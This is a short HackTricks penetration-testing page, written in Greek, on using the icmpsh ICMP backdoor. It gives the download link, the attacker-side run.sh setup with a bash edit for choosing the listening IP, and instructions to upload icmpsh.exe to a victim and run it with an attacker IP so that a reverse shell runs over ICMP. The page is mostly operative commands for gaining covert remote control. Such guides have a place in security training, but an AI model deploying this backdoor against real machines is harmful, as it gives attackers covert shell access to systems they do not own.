{{#include ../banners/hacktricks-training.md}}

Κατεβάστε το backdoor από: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Client side

Εκτελέστε το σενάριο: **run.sh**

**Αν λάβετε κάποιο σφάλμα, προσπαθήστε να αλλάξετε τις γραμμές:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**Για:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Πλευρά Θύματος**

Ανεβάστε **icmpsh.exe** στο θύμα και εκτελέστε:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
